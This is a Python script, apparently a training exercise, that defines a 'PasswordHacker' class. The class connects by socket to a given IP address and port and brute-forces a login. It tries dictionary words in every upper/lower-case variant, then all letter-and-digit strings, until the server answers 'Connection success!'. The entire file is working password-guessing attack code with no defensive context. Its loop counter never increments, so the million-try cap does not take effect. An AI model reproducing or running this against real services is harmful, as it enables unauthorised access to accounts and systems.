import argparse
import socket
import string
import itertools

class PasswordHacker:
    MAX_TRIES = 1_000_000
    ACCEPTED_CHARS = string.ascii_letters + string.digits
    n_ph = 0

    def __init__(self, ip_address, port):
        self.ip_address = ip_address
        self.port = port

    def __new__(cls, *args, **kwargs):
        if cls.n_ph == 0:
            cls.n_ph += 1
            return object.__new__(cls)
        return None

    def __repr__(self):
        return f'Password Hacker object with:\n' \
               f'IP ADDRESS: {self.ip_address}\n' \
               f'PORT: {self.port}\n'

    def __str__(self):
        return self.__repr__()

    def dictionary_brute_force(self, dict_path):
        with socket.socket() as hacking_socket, \
                open(dict_path, 'r', encoding='utf-8') as dict_file:
            hacking_socket.connect((self.ip_address, self.port))
            for password in dict_file:
                password = password.strip('\n')
                combinations = list(map(lambda x: ''.join(x), itertools.product(*([letter.lower(),
                    letter.upper()] for letter in password))))
                for combination in combinations:
                    enc_password = combination.encode()
                    hacking_socket.send(enc_password)
                    if hacking_socket.recv(32768).decode() == 'Connection success!':
                        return enc_password.decode()
            return None

    def brute_force(self):
        with socket.socket() as hacking_socket:
            hacking_socket.connect((self.ip_address, self.port))
            tries = 0
            r = 1
            iterator = itertools.product(self.ACCEPTED_CHARS, repeat=r)
            while tries <= 1_000_000:
                try:
                    enc_password = ''.join(next(iterator)).encode()
                    hacking_socket.send(enc_password)
                    if hacking_socket.recv(32768).decode() == 'Connection success!':
                        return enc_password.decode()
                except StopIteration:
                    r += 1
                    iterator = itertools.product(self.ACCEPTED_CHARS, repeat=r)
            return None

def main():
    parser = argparse.ArgumentParser(description='Process IP address, port, message for sending.')
    parser.add_argument('ip_address', metavar='IP', help='IP address for connection.')
    parser.add_argument('port', type=int, help='Port to connect.')
    args = parser.parse_args()

    password_hacker = PasswordHacker(args.ip_address, args.port)
    result = password_hacker.dictionary_brute_force('X:\\xxxx\\xxxx\\xxxx\\passwords.txt')

    if result == None:
        print('-> Password not found <-')
    else:
        print(result)

if __name__ == '__main__':
    main()
